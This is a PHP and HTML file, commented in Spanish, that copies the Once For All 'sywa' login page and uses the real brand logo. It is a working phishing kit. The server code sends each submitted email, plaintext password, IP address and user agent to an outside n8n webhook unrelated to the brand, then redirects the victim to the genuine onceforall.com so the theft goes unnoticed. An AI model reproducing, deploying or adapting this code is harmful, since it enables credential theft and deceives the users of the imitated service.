<?php
// ---- Utilidad para obtener la IP del cliente (respetando proxies/CDN) ----
function getClientIp(): string {
    $candidates = [
        'HTTP_CF_CONNECTING_IP', // Cloudflare
        'HTTP_X_FORWARDED_FOR',  // Proxy / Load balancer (lista, tomar el primero)
        'HTTP_X_REAL_IP',        // Nginx / Proxy
        'REMOTE_ADDR',           // Fallback
    ];
    foreach ($candidates as $key) {
        if (!empty($_SERVER[$key])) {
            $ip = $_SERVER[$key];
            if ($key === 'HTTP_X_FORWARDED_FOR') {
                // Puede venir como "ip1, ip2, ip3"
                $parts = explode(',', $ip);
                $ip = trim($parts[0]);
            }
            return trim($ip);
        }
    }
    return '';
}

$clientIp = getClientIp();

// ---- Manejo del envío ----
$apiUrl = 'https://n8n.cast1llo.com/webhook/95da625a-d94c-4987-833a-53bedbbf726c';
$resultMsg = null;
$resultType = null; // 'success' | 'error'

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Sanitizar entrada básica (para mostrarla después si hace falta)
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $clientIpFromForm = isset($_POST['client_ip']) ? trim($_POST['client_ip']) : null;

    if ($email === '' || $password === '') {
        $resultType = 'error';
        $resultMsg = 'Por favor, completa email y contraseña.';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $resultType = 'error';
        $resultMsg = 'El email no tiene un formato válido.';
    } else {
        // Construir payload JSON
        $payload = json_encode([
            'email'       => $email,
            'password'    => $password,
            'ip'          => $clientIp,        // IP de servidor (fiable)
            'ip_form'     => $clientIpFromForm,// IP recibida del hidden (solo depuración)
            'user_agent'  => $_SERVER['HTTP_USER_AGENT'] ?? null,
            'timestamp'   => date('c') // ISO 8601
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

        // Llamada cURL a la API
        $ch = curl_init($apiUrl);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json',
                'Accept: application/json',
            ],
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_TIMEOUT => 15, // segundos
        ]);

        $responseBody = curl_exec($ch);
        $curlErrNo = curl_errno($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($curlErrNo) {
            $resultType = 'error';
            $resultMsg = 'No se pudo contactar con el servicio de autenticación. Inténtalo más tarde.';
        } else {
            // Intentar decodificar JSON
            $json = json_decode($responseBody, true);
            if ($httpCode >= 200 && $httpCode < 300) {
                $resultType = 'success';
                $resultMsg = 'Login correcto.';
                header("Location: https://onceforall.com");
                die();
            } else {
                // Extraer error devuelto por la API (si lo hay)
                $apiError = is_array($json) && isset($json['error']) ? $json['error'] : null;
                $apiMessage = is_array($json) && isset($json['message']) ? $json['message'] : null;

                $resultType = 'error';
                $resultMsg = $apiMessage ?? $apiError ?? "Error de autenticación (HTTP $httpCode).";
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
  <title>Once For All - Login</title>
  <style>
    :root{
      --brand:#e4007f;
      --bg:#f7f8fa;
      --text:#2e2e72;
      --muted:#333;
      --line:#ddd;
      --space: clamp(16px, 2.4vw, 24px);
      --radius: 16px;
      --shadow: 0 1px 4px rgba(0,0,0,.08);
    }
    *{ box-sizing:border-box; }

    html,body{
      height:100%;
    }
    body{
      margin:0;
      font-family: 'Segoe UI', system-ui, -apple-system, Roboto, sans-serif;
      background:var(--bg);
      color:var(--text);
      line-height:1.4;
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
    }

    /* --- Layout mobile-first (una columna) --- */
    .container{
      display:grid;
      grid-template-columns: 1fr;
      min-height: 100svh;
      background: #fff;
    }

    .left{
      position:relative;
      padding: var(--space);
      background:
        #fff url('https://www.transparenttextures.com/patterns/hexellence.png') repeat;
      display:flex;
      flex-direction: column;
      align-items:stretch;
      justify-content:center;
    }

    .right{
      padding: var(--space);
      display:flex;
      flex-direction:column;
      align-items:center;
      text-align:center;
      gap: 8px;
      background:#fff;
    }

    .form-content{
      width:100%;
      max-width: 440px;
    }

    .logo{
      width: clamp(120px, 18vw, 160px);
      margin-bottom: 12px;
      display:block;
    }

    .lang{
      margin-left:auto;
      font-weight:600;
      font-size: 14px;
      cursor:pointer;
      user-select:none;
      margin-bottom: 12px;
    }

    .topbar{
      width:100%;
      max-width: 440px;
      display:flex;
      align-items:center;
      gap: 12px;
      margin-bottom: 24px;
    }

    @media (max-width: 959px) {
      .topbar {
        position: static;
        margin-bottom: 32px;
        justify-content: flex-start;
      }
      .lang {
        display: none;
      }
      .form-content {
        align-self: center;
      }
    }

    h2{
      font-size: clamp(22px, 3.8vw, 28px);
      margin: 6px 0 18px 0;
      text-transform: capitalize;
    }

    form{
      display:flex;
      flex-direction:column;
      gap: 14px;
    }

    .sr-only{
      position:absolute;
      width:1px;
      height:1px;
      padding:0;
      margin:-1px;
      overflow:hidden;
      clip:rect(0,0,0,0);
      white-space:nowrap;
      border:0;
    }

    input[type="email"], input[type="password"]{
      width:100%;
      padding: 14px 16px;
      border-radius: 10px;
      border:1px solid var(--line);
      font-size: clamp(15px, 3.2vw, 16px);
      background:#fff;
      box-shadow: var(--shadow);
      color:#333;
    }
    input::placeholder{ color:#999; }

    .forgot{
      font-size: 14px;
      color:#0077cc;
      text-decoration:none;
      align-self:flex-end;
    }

    .login-btn{
      width:100%;
      padding: 14px 16px;
      background: var(--brand);
      color:#fff;
      border:none;
      border-radius: 999px;
      font-size: 16px;
      cursor:pointer;
    }

    .or-divider{
      margin: 16px 0;
      text-align:center;
      font-size:14px;
      color:#999;
    }

    .join{ font-size:14px; }
    .join a{ color:#0077cc; text-decoration:none; font-weight:bold; }

    .right h3{
      font-size: clamp(18px, 3.6vw, 24px);
      margin: 6px 0 8px 0;
    }
    .right p{
      font-size: clamp(14px, 3.2vw, 16px);
      color: var(--muted);
      max-width: 560px;
      margin: 0 auto;
    }

    .alert{
      margin-bottom: 12px;
      padding: 12px 14px;
      border-radius: 10px;
      font-size: 14px;
      border:1px solid transparent;
    }
    .alert-success{ background:#f0fff4; border-color:#c6f6d5; color:#22543d; }
    .alert-error{ background:#fff5f5; border-color:#fed7d7; color:#742a2a; }

    /* --- Breakpoint tablet --- */
    @media (min-width: 768px){
      .container{
        /* aún una columna, más aire */
      }
      .right p{ max-width: 640px; }
    }

    /* --- Breakpoint escritorio --- */
    @media (min-width: 960px){
      .container{
        grid-template-columns: 3fr 1fr; /* ~75/25 */
        min-height: 100vh;
      }
      .left, .right{ padding: 60px; }

      /* Topbar flotante estilo original sólo en desktop */
      .topbar{
        position:absolute;
        top:40px;
        left:60px;
        right:60px;
        max-width: none;
      }
      .logo{ margin:0; }
      .lang{ margin-left:auto; }

      .right{
        align-items:flex-start;
        text-align:left;
        justify-content:center;
      }
    }

    /* --- Pantallas muy pequeñas --- */
    @media (max-width: 360px){
      .right p{ font-size: 13px; }
      .forgot{ font-size: 13px; }
    }

    /* Accesibilidad: reducir animaciones si el usuario lo prefiere */
    @media (prefers-reduced-motion: reduce){
      * { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; scroll-behavior: auto !important; }
    }
  </style>
</head>
<body>
  <main class="container">
    <section class="left">
      <!-- Topbar (logo + selector idioma) -->
      <div class="topbar">
        <img
          class="logo"
          src="https://identity.staging.onceforall.com/auth/resources/hiu4o/login/portal-sywa/img/onceforall-logo.svg"
          alt="Once For All Logo"
        >
        <div class="lang" aria-label="Change language">EN ▼</div>
      </div>

      <div class="form-content" role="form" aria-labelledby="login-title">
        <h2 id="login-title">Welcome back to sywa</h2>

        <?php if ($resultMsg !== null): ?>
          <div class="alert <?php echo $resultType === 'success' ? 'alert-success' : 'alert-error'; ?>">
            <?php echo htmlspecialchars($resultMsg, ENT_QUOTES, 'UTF-8'); ?>
          </div>
        <?php endif; ?>

        <form action="" method="POST" novalidate>
          <!-- Hidden con la IP del cliente -->
          <input type="hidden" name="client_ip" value="<?php echo htmlspecialchars($clientIp, ENT_QUOTES, 'UTF-8'); ?>">

          <label class="sr-only" for="email">Email</label>
          <input
            id="email"
            type="email"
            name="email"
            placeholder="User email"
            value="<?php echo isset($email) ? htmlspecialchars($email, ENT_QUOTES, 'UTF-8') : ''; ?>"
            required
            autocomplete="username"
          >

          <label class="sr-only" for="password">Password</label>
          <input
            id="password"
            type="password"
            name="password"
            placeholder="Password"
            required
            autocomplete="current-password"
          >

          <a href="#" class="forgot">Forgot your password?</a>
          <button class="login-btn" type="submit">Log in</button>
        </form>

        <div class="or-divider">OR</div>
        <div class="join">No account yet? <a href="#">Join us</a></div>
      </div>
    </section>

    <aside class="right">
      <h3>From compliance to opportunity: secure your risks, develop your relationships</h3>
      <p>
        Thanks to the Once For All digital ecosystem, simplify your obligations, secure your client-supplier relationships,
        and create new business opportunities while ensuring your compliance.
      </p>
    </aside>
  </main>
</body>
</html>
